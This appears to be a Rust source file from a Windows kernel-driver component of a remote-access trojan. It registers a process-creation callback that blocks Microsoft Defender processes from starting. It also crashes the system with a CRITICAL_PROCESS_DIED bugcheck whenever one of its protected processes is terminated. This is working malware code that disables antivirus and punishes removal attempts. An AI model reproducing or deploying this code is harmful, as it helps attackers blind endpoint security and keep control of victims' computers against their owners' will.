use core::ffi::c_void;
use core::sync::atomic::Ordering;
use core::{mem, ptr};

use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    KeBugCheckEx, KeDelayExecutionThread, PsCreateSystemThread, PsSetCreateProcessNotifyRoutineEx,
};
use wdk_sys::{HANDLE, LARGE_INTEGER, PEPROCESS, PPS_CREATE_NOTIFY_INFO, STATUS_ACCESS_DENIED};

use crate::global::{MS_DEFENDER_AHO_CORASICK, SELF_DEFENSE_PIDS};
use crate::info;
use crate::utils::match_process_name;

pub fn ps_set_create_process_notify_routine_ex(extra: &KernelHandoff) -> anyhow::Result<*const u8> {
    if !extra.process_notify_trampoline.is_null() {
        let status = unsafe {
            PsSetCreateProcessNotifyRoutineEx(
                Some(mem::transmute::<
                    *const u8,
                    unsafe extern "C" fn(PEPROCESS, HANDLE, PPS_CREATE_NOTIFY_INFO),
                >(extra.process_notify_trampoline)),
                0,
            )
        };

        anyhow::ensure!(
            nt_success(status),
            "PsSetCreateProcessNotifyRoutineEx error: 0x{status:X}",
        );
    }

    Ok(extra.process_notify_trampoline)
}

unsafe extern "C" fn _bugcheck_on_exit(_: *mut c_void) {
    let mut sleep = LARGE_INTEGER {
        QuadPart: -100000000, // 10s
    };
    unsafe {
        let _ = KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep);
        KeBugCheckEx(
            0xEF, // CRITICAL_PROCESS_DIED
            0, 0, 0, 0,
        )
    }
}

#[unsafe(export_name = "ProcessNotifyRoutine")]
unsafe extern "C" fn process_notify_routine(
    process: PEPROCESS,
    pid: HANDLE,
    info: PPS_CREATE_NOTIFY_INFO,
) {
    if let Some(info) = unsafe { info.as_mut() } {
        // Process creation
        if match_process_name(process, &MS_DEFENDER_AHO_CORASICK) {
            info!("Blocking creation of process {}", pid as u64);
            info.CreationStatus = STATUS_ACCESS_DENIED;
        }
    } else {
        // Process deletion
        if let Some(lock) = unsafe { SELF_DEFENSE_PIDS.load(Ordering::Acquire).as_ref() } {
            let set = lock.lock();
            if set.contains(&pid) {
                let mut thread = HANDLE::default();
                unsafe {
                    let _ = PsCreateSystemThread(
                        &mut thread,
                        0,
                        ptr::null_mut(),
                        ptr::null_mut(),
                        ptr::null_mut(),
                        Some(_bugcheck_on_exit),
                        ptr::null_mut(),
                    );
                }
            }
        }
    }
}
